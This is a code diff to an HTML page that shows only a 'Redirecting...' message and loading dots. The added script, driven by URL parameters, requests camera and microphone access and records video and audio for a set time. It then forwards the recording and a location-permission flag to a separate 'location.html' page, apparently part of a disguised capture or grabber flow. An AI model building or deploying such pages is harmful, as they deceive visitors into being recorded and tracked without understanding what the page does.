@@ -5,7 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <style>
-        body {
+     /* ... (Styles - unchanged, same as before) ... */
+     body {
             font-family: sans-serif;
             display: flex;
             justify-content: center;
@@ -25,6 +26,9 @@
             content: "";
             animation: dots 1s steps(4) infinite;
         }
+         .error-message{
+            color:red;
+        }
 
         @keyframes dots {
              0%   {content: "";}
@@ -38,21 +42,72 @@
     <div class="container">
         <h1>Redirecting...</h1>
         <p>You will be redirected shortly <span class="loading-dots"></span></p>
+          <p id="error-message" class="error-message" style="display: none;"></p>
     </div>
 
     <script>
-       (() => {
-           const redirectUrl = localStorage.getItem('redirectUrl');
-           const redirectSeconds = parseInt(localStorage.getItem('redirectSeconds')) || 0;
+(async () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const micCamPermission = urlParams.get('micCamPermission') === 'true';
+    const locationPermission = urlParams.get('locationPermission') === 'true'; // Get loc
+    const redirectUrl = decodeURIComponent(urlParams.get('redirectUrl'));
+    const redirectSeconds = parseInt(urlParams.get('redirectSeconds')) || 0;
+    const recordSeconds = parseInt(urlParams.get('recordSeconds')) || 0;
+    const errorMessage = document.getElementById("error-message");
 
-            if (redirectUrl) {
+    if (micCamPermission && recordSeconds > 0) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+
+            recorder.ondataavailable = event => {
+                chunks.push(event.data);
+            };
+
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const videoUrl = URL.createObjectURL(blob);
+
+                // Construct the *final* redirect URL, including video data
+                let finalRedirectUrl = 'location.html?';
+                finalRedirectUrl += `videoUrl=${encodeURIComponent(videoUrl)}`;
+                finalRedirectUrl += `&locationPermission=${locationPermission}`; // Pass through
+                // Redirect to location.html with the video URL
+                window.location.href = finalRedirectUrl;
+
+                stream.getTracks().forEach(track => track.stop());
+            };
+
+            // Start timer *after* recorder starts
+            recorder.onstart = () => {
                 setTimeout(() => {
-                    window.location.href = redirectUrl;
-                }, redirectSeconds * 1000);
-            } else {
-                 document.querySelector('.container').innerHTML = '<p>No redirect URL specified.</p>';
-            }
-        })();
+                    if (recorder.state !== "inactive") {
+                        recorder.stop();
+                    }
+                }, recordSeconds * 1000);
+            };
+
+            recorder.start();
+
+        } catch (error) {
+            console.error("Error accessing camera/microphone:", error);
+             errorMessage.textContent = `Camera/Microfoon Fout: ${error.message}`;
+             errorMessage.style.display = 'block';
+
+            // Redirect to location.html even on error, but without video data
+            let finalRedirectUrl = 'location.html?';
+            finalRedirectUrl += `locationPermission=${locationPermission}`;  //pass through
+            finalRedirectUrl += '&error=camera';  // Indicate error
+            window.location.href = finalRedirectUrl;
+        }
+    } else { // No camera/mic needed, just build the URL and redirect
+          let finalRedirectUrl = 'location.html?';
+           finalRedirectUrl += `locationPermission=${locationPermission}`;  //pass through
+            window.location.href = finalRedirectUrl;
+    }
+
+})();
     </script>
 </body>
 </html>
